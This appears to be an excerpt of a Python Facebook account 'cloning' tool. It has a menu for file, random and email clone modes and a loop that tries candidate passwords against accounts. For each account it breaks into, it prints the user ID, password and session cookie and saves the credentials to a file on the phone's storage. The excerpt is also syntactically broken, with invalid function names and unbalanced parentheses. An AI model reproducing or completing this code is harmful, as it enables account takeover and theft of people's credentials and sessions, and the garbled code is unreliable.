...
def menu():
	...
	JJS404-CYBER(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	JJS404-CYBER((f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	JJS404-CYBER((f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	JJS404-CYBER((f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	JJS404-CYBER((f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____JUBU_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____JUBU_____ in ['1']:
		C1()
	if _____JUBU_____ in ['2']:
		Y2()
	if _____JUBU_____ in ['3']:
		BER()
	if _____JUBU_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____JUBU_____ in ['0']:
		exit()
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mJUBU\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/JUBUtxt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        ...
        sys.stdout.write('\r%s[JUBU]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def mex():
    ...
    banner()   
    try:
        key1 = open('/sdcard/.jubu.txt', 'r').read()
    except IOError:
        os.system('clear')
        banner()
